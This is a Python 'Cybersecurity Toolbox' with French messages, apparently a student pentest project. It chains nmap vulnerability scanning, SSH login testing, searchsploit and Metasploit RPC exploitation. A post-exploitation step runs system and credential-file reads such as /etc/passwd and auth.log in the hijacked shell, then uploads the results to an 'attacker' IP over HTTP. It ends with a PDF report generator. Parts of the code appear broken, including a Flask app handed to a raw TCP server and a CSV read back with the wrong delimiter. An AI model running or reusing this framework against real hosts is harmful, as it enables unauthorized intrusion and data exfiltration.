import requests
import nmap
import hashlib
import getpass
from zxcvbn import zxcvbn
import os
import subprocess
import pandas as pd
import time
import re
import paramiko
from pymetasploit3.msfrpc import MsfRpcClient
import matplotlib.pyplot as plt
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Table, TableStyle, Image
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib import colors
from io import BytesIO
import http.server
import socketserver
from threading import Thread
from flask import Flask, request, send_file

print("Cybersecurity Toolbox")
print("Created by: RODIN Emile")
print("Codename: CyberWarrior")

    # Définir les options d'affichage
pd.set_option('display.width', 1000)
pd.set_option('display.max_columns', 50)

class Toolbox:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.API_URL = 'https://api.pwnedpasswords.com/range/'
        self.target_ip = ''
        self.metasploit_host = ""
        self.metasploit_port = 0
        self.metasploit_password = ""
        self.shell = None
        self.script_directory = os.path.dirname(os.path.abspath(__file__))

    def configure(self, target_ip):
        self.target_ip = target_ip

    def discover_ports_and_detect_vulnerabilities(self, ip):
     print(f'Analyse de {ip}...')
     self.nm.scan(ip, arguments='-p- -sV --script vulners -v')
     rows = []
     for host in self.nm.all_hosts():
        for proto in self.nm[host].all_protocols():
            lport = sorted(self.nm[host][proto].keys())
            for port in lport:
                service = self.nm[host][proto][port].get('name', '')
                state = self.nm[host][proto][port].get('state', '')
                product = self.nm[host][proto][port].get('product', '')
                version = self.nm[host][proto][port].get('version', '')
                cpe = self.nm[host][proto][port].get('cpe', '')
                # Vérification de l'existence de scripts et traitement des vulnérabilités
                if 'script' in self.nm[host][proto][port]:
                    scripts = self.nm[host][proto][port]['script']
                    if isinstance(scripts, dict) and 'vulners' in scripts:
                        vulners_info = scripts['vulners']
                        if isinstance(vulners_info, str):
                            # Si vulners_info est une chaîne de caractères, analysez-la avec des regex
                            cve_matches = re.findall(r'(CVE-\d{4}-\d{4,7})\s+(\d+\.\d+)\s+(https://vulners.com/cve/CVE-\d{4}-\d{4,7})', vulners_info)
                            for cve_match in cve_matches:
                                cve_id = cve_match[0]
                                score = cve_match[1]
                                link = cve_match[2]
                                rows.append([host, proto, port, state, service, product, version, cpe, cve_id, score, link])
                else:
                    rows.append([host, proto, port, state, service, product, version, cpe, '', '', ''])
    # Création du DataFrame
        data = pd.DataFrame(rows, columns=['Hôte', 'Protocole', 'Port', 'État', 'Service', 'Logiciel', 'Version', 'CPE', 'CVE_ID', 'CVSS_Score', 'CVE_Link'])
        # Chemin du fichier CSV de sortie
        csv_file = os.path.join(self.script_directory, 'vulnerabilites.csv')
        # Export vers CSV avec encodage UTF-8
        data.to_csv(csv_file, index=False, encoding='utf-8-sig')
        print(f'Le fichier CSV a été créé : {csv_file}')
        

    def analyze_password_security(self):
        password = getpass.getpass("Veuillez entrer votre mot de passe : ")
        if not password:
            print("Erreur : Vous devez entrer un mot de passe.")
            return
        if not self.is_password_strong(password):
            print("Erreur : Votre mot de passe ne respecte pas les politiques de mot de passe.")
            print("Politique de mot de passe : au moins 8 caractères, contenant au moins une lettre majuscule, une lettre minuscule, un chiffre et un caractère spécial")
            return
        analysis = zxcvbn(password)
        print("Analyse de la sécurité du mot de passe :")
        print(f"\nScore : {analysis['score']} (un score plus élevé est plus sûr)")
        print(f"\nTemps de crack estimé (en secondes) : {analysis['crack_times_seconds']['online_no_throttling_10_per_second']}")
        if analysis['score'] < 3:
            print("\nVotre mot de passe est faible. Veuillez considérer les suggestions ci-dessus.")
        else:
            print("\nVotre mot de passe semble assez fort.")
        pwned_count = self.pwned_api_check(password)
        if pwned_count:
            print(f"Attention : Votre mot de passe a été exposé {pwned_count} fois dans les violations de données connues. Vous devriez envisager de changer votre mot de passe.")

    def pwned_api_check(self, password):
        sha1password = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
        first5_char, tail = sha1password[:5], sha1password[5:]
        try:
            response = requests.get(self.API_URL + first5_char, verify=True)
            if response.status_code == 429:
                print("Trop de requêtes. Veuillez attendre un moment et réessayer.")
                time.sleep(int(response.headers['Retry-After']))
                return self.pwned_api_check(password)
            hashes = (line.split(':') for line in response.text.splitlines())
            count = next((int(count) for t, count in hashes if t == tail), 0)
            return count
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête à l'API pwnedpasswords.com : {e}")
            return None

    def is_password_strong(self, password):
        if len(password) < 8:
            return False
        if not re.search(r'[A-Z]', password):
            return False
        if not re.search(r'[a-z]', password):
            return False
        if not re.search(r'\d', password):
            return False
        if not re.search(r'\W', password):
            return False
        return True

    def authentication_tests(self, target_ip):
        print("Tests d'authentification...")
        username = input("Entrez un nom d'utilisateur : ")
        password = getpass.getpass("Entrez un mot de passe : ")
        if self.ssh_authentication_test(target_ip, username, password):
            print("Authentification réussie!")
        else:
            print("Authentification échouée!")

    def ssh_authentication_test(self, target_ip, username, password):
        if self.ssh_connect(target_ip, username, password):
            return True
        else:
            return False

    def ssh_connect(self, target_ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password)
            return True
        except paramiko.AuthenticationException:
            return False
        finally:
            ssh.close()
            
    def search_exploit(self):
     try:
        search_query = input("Entrez votre recherche d'exploit : ")
        if not search_query:
            print("Veuillez saisir une recherche valide.")
            return

        result = subprocess.check_output(["searchsploit", search_query], universal_newlines=True)
        print(result)
     except FileNotFoundError:
        print("Erreur : SearchSploit n'est pas installé. Veuillez l'installer.")
     except subprocess.CalledProcessError:
        print("Erreur lors de l'exécution de la commande SearchSploit.")
        
    def exploit_vulnerabilities(self):
        self.metasploit_host = input("Entrez l'adresse IP de la machine Metasploit : ")
        self.metasploit_port = int(input("Entrez le port de la machine Metasploit (par défaut : 55552) : ") or 55552)
        self.metasploit_password = getpass.getpass("Entrez le mot de passe Metasploit : ")
        try:
            client = MsfRpcClient(password=self.metasploit_password, server=self.metasploit_host, port=self.metasploit_port, ssl=True)
        except Exception as e:
            print(f"Erreur lors de la connexion à Metasploit : {e}")
            return

        # Demander à l'utilisateur de saisir un exploit
        exploit_name = input("Entrez le nom de l'exploit à utiliser : ")
        try:
            exploit = client.modules.use('exploit', exploit_name)
        except Exception as e:
            print(f"Erreur lors de la sélection de l'exploit : {e}")
            return

        # Lister tous les payloads disponibles pour l'exploit
        payloads = exploit.payloads
        if not payloads:
            print("Aucun payload disponible pour cet exploit.")
            return

        print("Liste des payloads disponibles pour l'exploit sélectionné :")
        for i, payload in enumerate(payloads):
            print(f"{i + 1}. {payload}")

        # Sélectionner un payload
        payload_choice = int(input("Sélectionnez un payload (par numéro) : ")) - 1
        if payload_choice < 0 or payload_choice >= len(payloads):
            print("Choix invalide.")
            return

        payload_name = payloads[payload_choice]
        exploit.payload = payload_name

        # Configurer les options de l'exploit
        exploit['RHOSTS'] = self.target_ip  # Remplacez par l'adresse IP cible
        exploit['RPORT'] = int(input("Entrez le port cible : ") or 21)  # Remplacez par le port cible, valeur par défaut 21

        # Exécuter l'exploit
        try:
            job_id = exploit.execute(payload=payload_name)
            print(f"ID du travail : {job_id}")
        except Exception as e:
            print(f"Erreur lors de l'exécution de l'exploit : {e}")
            return

        # Attente de la création de la session
        time.sleep(5)  # Ajustez le temps de pause si nécessaire

        # Vérifiez si une session a été créée
        if client.sessions.list:
            session_id = next(iter(client.sessions.list))  # Obtenez le premier ID de session
            print(f"ID de la session : {session_id}")
            self.shell = client.sessions.session(session_id)
        else:
            print("Aucune session n'a été créée. Vérifiez la sortie de l'exploit pour les erreurs.")

    
    def post_exploitation(self, shell):
        commandes = [
            "uname -a",
            "hostname",
            "cat /etc/issue",
            "ip addr show",
            "ip route show",
            "arp -a",
            "ps aux",
            "systemctl list-units --type=service",  # Général
            "cat /etc/passwd",
            "cat /etc/group",
            "getent group",
            "ls -al /",
            "find / -type f -name '*.conf'",
            "journalctl -u systemd",  # Basé sur Systemd
            "lastlog",
            "netstat -an",
            "ss -an",
            "lsblk -d -o NAME,FSTYPE,SIZE,MOUNTPOINT,LABEL",
            "cryptsetup luksDump /dev/sda1",  # Si LUKS est utilisé
            "iptables -L",
            "cat /var/log/syslog",
            "cat /var/log/auth.log"
        ]

        fichier_sortie = os.path.join(self.script_directory, "exploit_results.txt")
        with open(fichier_sortie, 'w') as f:
            for commande in commandes:
                shell.write(commande + "\n")
                time.sleep(2)  # Ajustez si nécessaire
                resultat_commande = shell.read()
                f.write(f"Commande: {commande}\n")
                f.write(resultat_commande + "\n\n")

        # Démarrer le serveur HTTP dans un thread séparé
        thread_serveur_http = Thread(target=self.start_http_server)
        thread_serveur_http.start()

    def start_http_server(self):
        app = Flask(__name__)

        @app.route('/receive', methods=['POST'])
        def receive_file():
            try:
                f = request.files['file']
                f.save(os.path.join(self.script_directory, f.filename))
                return 'Fichier reçu avec succès.', 200
            except Exception as e:
                return f'Erreur lors de la réception du fichier : {e}', 500

        server = socketserver.TCPServer(('0.0.0.0', 8000), app)
        server_thread = Thread(target=server.serve_forever)
        server_thread.daemon = True  # Le thread se terminera lorsque le programme principal se terminera
        server_thread.start()
        print("Serveur HTTP démarré sur le port 8000.")

    def envoyer_resultats_exploit(self):
        ip_attaquant = input("Entrez l'adresse IP de l'attaquant : ")
        port_attaquant = int(input("Entrez le port d'écoute de l'attaquant : "))

        url = f"http://{ip_attaquant}:{port_attaquant}/receive"
        fichier_sortie = os.path.join(self.script_directory, "exploit_results.txt")
        try:
            files = {'file': open(fichier_sortie, 'rb')}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                print("Fichier envoyé avec succès.")
            else:
                print(f"Erreur lors de l'envoi du fichier : {response.status_code}")
        except Exception as e:
            print(f"Erreur lors de l'envoi du fichier : {e}")


    def generer_rapport(self):
        try:
            # Demander à l'utilisateur de saisir les informations
            nom_projet = input("Veuillez entrer le nom du projet : ")
            date_analyse = input("Veuillez entrer la date de l'analyse : ")
            nom_analyste = input("Veuillez entrer le nom de l'analyste : ")
            outils_utilises = input("Veuillez entrer les outils utilisés : ")
            methodologie_utilisee = input("Veuillez entrer la méthodologie utilisée : ")

            # Charger les données des vulnérabilités depuis le CSV
            vulnerabilities_df = pd.read_csv('vulnerabilites.csv', delimiter=';')

            # Vérifier si les colonnes nécessaires sont présentes
            required_columns = ['Hôte', 'Protocole', 'Service', 'Logiciel', 'Version', 'CVE_ID', 'CVSS_Score']
            for col in required_columns:
                if col not in vulnerabilities_df.columns:
                    raise ValueError(f"La colonne '{col}' n'a pas été trouvée dans le fichier CSV.")

            # Remplir les colonnes manquantes en fonction des CVE_ID et CVSS_Score
            for index, row in vulnerabilities_df.iterrows():
                cvss_score = row['CVSS_Score']

                # Déduction du niveau de priorité
                if cvss_score >= 7.0:
                    vulnerabilities_df.at[index, 'Niveau_de_priorite'] = 'Urgent'
                elif cvss_score >= 4.0:
                    vulnerabilities_df.at[index, 'Niveau_de_priorite'] = 'Standard'
                else:
                    vulnerabilities_df.at[index, 'Niveau_de_priorite'] = 'Bas'

                # Déduction de la difficulté de correction
                if cvss_score >= 7.0:
                    vulnerabilities_df.at[index, 'Difficulte_de_correction'] = 'Complexe'
                elif cvss_score >= 4.0:
                    vulnerabilities_df.at[index, 'Difficulte_de_correction'] = 'Modérée'
                else:
                    vulnerabilities_df.at[index, 'Difficulte_de_correction'] = 'Facile'

                # Déduction de la sévérité
                if cvss_score >= 9.0:
                    vulnerabilities_df.at[index, 'Severite'] = 'Intolérable'
                elif cvss_score >= 7.0:
                    vulnerabilities_df.at[index, 'Severite'] = 'Substantielle'
                elif cvss_score >= 4.0:
                    vulnerabilities_df.at[index, 'Severite'] = 'Modérée'
                else:
                    vulnerabilities_df.at[index, 'Severite'] = 'Acceptable'

            # Réduire le tableau aux colonnes spécifiques
            reduced_df = vulnerabilities_df[['Hôte', 'Protocole', 'Service', 'Logiciel', 'Version', 'CVE_ID', 'CVSS_Score', 'Niveau_de_priorite', 'Difficulte_de_correction', 'Severite']]

            # Générer le rapport PDF
            nom_fichier_pdf = 'rapport_vulnerabilites.pdf'
            doc = SimpleDocTemplate(nom_fichier_pdf, pagesize=letter)

            # Titre et informations générales
            styles = getSampleStyleSheet()
            titre = styles['Title']
            sous_titre = styles['Heading1']
            normal = styles['Normal']

            titre_rapport = Paragraph("Rapport de Vulnérabilités", titre)
            sous_titre_rapport = Paragraph("Généré par CyberWarrior", sous_titre)
            infos_generales = f"""
            <br/><br/>
            <b>Informations générales :</b><br/>
            <b>Nom du projet / système analysé :</b> {nom_projet}<br/>
            <b>Date de l'analyse :</b> {date_analyse}<br/>
            <b>Nom de l'analyste :</b> {nom_analyste}<br/>
            <b>Outils utilisés :</b> {outils_utilises}<br/>
            <b>Méthodologie utilisée :</b> {methodologie_utilisee}<br/>
            """

            # Introduction
            introduction = """
            ## Rapport des Tests d'Intrusion et Vulnérabilités Identifiées

            ### 1. Introduction
            Ce rapport présente les résultats des tests d'intrusion effectués et les vulnérabilités identifiées.
            """

            elements = [
                titre_rapport, sous_titre_rapport,
                Paragraph(infos_generales, normal),
                Paragraph(introduction, normal)
            ]

            # Visualisations graphiques
            elements.append(Paragraph("\n\nVisualisations", sous_titre))

            # Histogramme des scores CVSS
            plt.figure(figsize=(8, 6))
            plt.hist(vulnerabilities_df['CVSS_Score'], bins=10, edgecolor='black')
            plt.xlabel('CVSS Score')
            plt.ylabel('Nombre de Vulnérabilités')
            plt.title('Répartition des Scores CVSS')
            plt.grid(True)
            plt.tight_layout()
            cvss_histogram_path = 'cvss_histogram.png'
            plt.savefig(cvss_histogram_path)
            plt.close()
            elements.append(Paragraph("Histogramme des Scores CVSS", styles['Heading2']))
            elements.append(Image(cvss_histogram_path, width=400, height=300))

            # Diagramme à barres des services
            services_counts = vulnerabilities_df['Service'].value_counts()
            plt.figure(figsize=(8, 6))
            services_counts.plot(kind='bar', color='skyblue')
            plt.xlabel('Services')
            plt.ylabel('Nombre de Vulnérabilités')
            plt.title('Vulnérabilités par Service')
            plt.grid(True)
            plt.tight_layout()
            services_bar_chart_path = 'services_bar_chart.png'
            plt.savefig(services_bar_chart_path)
            plt.close()
            elements.append(Paragraph("Diagramme à Barres des Services", styles['Heading2']))
            elements.append(Image(services_bar_chart_path, width=400, height=300))

            # Diagramme circulaire des logiciels vulnérables
            software_counts = vulnerabilities_df['Logiciel'].value_counts().head(10)
            plt.figure(figsize=(8, 6))
            plt.pie(software_counts, labels=software_counts.index, autopct='%1.1f%%', startangle=140)
            plt.axis('equal')
            plt.title('Répartition des Vulnérabilités par Logiciel')
            plt.tight_layout()
            software_pie_chart_path = 'software_pie_chart.png'
            plt.savefig(software_pie_chart_path)
            plt.close()
            elements.append(Paragraph("Diagramme Circulaire des Logiciels Vulnérables", styles['Heading2']))
            elements.append(Image(software_pie_chart_path, width=400, height=300))

            # Tableau des vulnérabilités
            elements.append(Paragraph("\n\nRésumé des Vulnérabilités", sous_titre))
            data = [list(reduced_df.columns)] + reduced_df.values.tolist()
            tableau = Table(data)
            tableau.setStyle(TableStyle([('GRID', (0, 0), (-1, -1), 1, colors.black)]))
            elements.append(tableau)

            # Calcul des résumés pour le tableau récapitulatif
            recap_priority = vulnerabilities_df['Niveau_de_priorite'].value_counts()
            recap_difficulty = vulnerabilities_df['Difficulte_de_correction'].value_counts()
            recap_severity = vulnerabilities_df['Severite'].value_counts()

            # Préparation des données pour le tableau récapitulatif
            recap_data = [
                ["Niveau de priorité", "Nombre", "Difficulté de correction", "Nombre", "Sévérité", "Nombre"],
                ["Urgent", recap_priority.get('Urgent', 0), "Complexe", recap_difficulty.get('Complexe', 0), "Intolérable", recap_severity.get('Intolérable', 0)],
                ["Standard", recap_priority.get('Standard', 0), "Modérée", recap_difficulty.get('Modérée', 0), "Substantielle", recap_severity.get('Substantielle', 0)],
                ["Bas", recap_priority.get('Bas', 0), "Facile", recap_difficulty.get('Facile', 0), "Modérée", recap_severity.get('Modérée', 0)]
            ]

            # Tableau récapitulatif
            elements.append(Paragraph("\n\nTableau Récapitulatif", sous_titre))
            recap_table = Table(recap_data)
            recap_table.setStyle(TableStyle([('GRID', (0, 0), (-1, -1), 1, colors.black)]))
            elements.append(recap_table)

            # Écriture du document PDF
            doc.build(elements)

            # Supprimer les fichiers temporaires d'images
            os.remove(cvss_histogram_path)
            os.remove(services_bar_chart_path)
            os.remove(software_pie_chart_path)

            print(f"Le rapport a été généré avec succès sous le nom '{nom_fichier_pdf}'.")

        except Exception as e:
            print(f"Erreur lors de la génération du rapport : {str(e)}")

    def run(self):
        while True:
            print("\n=== MENU PRINCIPAL ===")
            print("\nVeuillez choisir une option :\n")
            print("1. Configuration")
            print("2. Découverte de ports, de services et Détection de vulnérabilités")
            print("3. Analyse de la sécurité des mots de passe")
            print("4. Tests d'authentification")
            print("5. Searchsploit")
            print("6. Exploitation de vulnérabilités")
            print("7. Post-exploitation")
            print("8. Générer le rapport des Tests d'Intrusion")
            print("9. Quitter")

            choice = input("\nVotre choix : ")

            if choice == "1":
                self.configure(input("\nVeuillez entrer l'adresse IP cible : "))

            elif choice == "2":
                if not self.target_ip:
                    print("\nErreur : vous devez d'abord configurer l'outil (option 1) avant de choisir cette option.")
                else:
                    self.discover_ports_and_detect_vulnerabilities(self.target_ip)

            elif choice == "3":
                self.analyze_password_security()

            elif choice == "4":
                if not self.target_ip:
                    print("\nErreur : vous devez d'abord configurer l'outil (option 1) avant de choisir cette option.")
                else:
                    self.authentication_tests(self.target_ip)

            elif choice == "5":
                self.search_exploit()

            elif choice == "6":
                if not self.target_ip:
                    print("\nErreur : vous devez d'abord configurer l'outil (option 1) avant de choisir cette option.")
                else:
                    self.exploit_vulnerabilities()

            elif choice == "7":
                if not self.target_ip:
                    print("\nErreur : vous devez d'abord configurer l'outil (option 1) avant de choisir cette option.")
                elif not self.shell:
                    print("\nErreur : vous devez d'abord récupérer une session active (option 6) avant de choisir cette option.")
                else:
                    self.post_exploitation(self.shell)

            elif choice == "8":
                self.generer_rapport()
            elif choice == "9":
                print("Merci d'avoir utilisé la toolbox, au revoir !")
                break

            else:
                print("Erreur : choix invalide!")

# Exécution de la fonction pour générer le rapport
toolbox = Toolbox()
toolbox.run()
